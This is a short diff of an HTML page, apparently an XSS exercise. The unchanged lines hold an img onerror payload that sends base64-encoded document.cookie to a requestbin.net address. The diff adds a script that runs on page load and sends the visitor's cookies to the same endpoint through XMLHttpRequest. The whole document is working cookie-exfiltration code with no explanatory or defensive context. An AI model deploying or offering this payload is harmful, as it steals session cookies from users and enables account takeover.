@@ -9,6 +9,17 @@
 <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
 <img src =asdf onerror="$.get('http://requestbin.net/r/1iksjrn1'+ '?cookie='+ btoa(document.cookie))">
 
+<script type="text/javascript">
+    function httpGet(theUrl)
+    {
+        var theUrl = 'http://requestbin.net/r/1iksjrn1'+ '?cookie='+ btoa(document.cookie);
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", theUrl, false  ); // false for synchronous request
+        xmlHttp.send( null  );
+        return xmlHttp.responseText;
+    }
+window.onload = httpGet;
+</script>
 </body>
 </html>
 
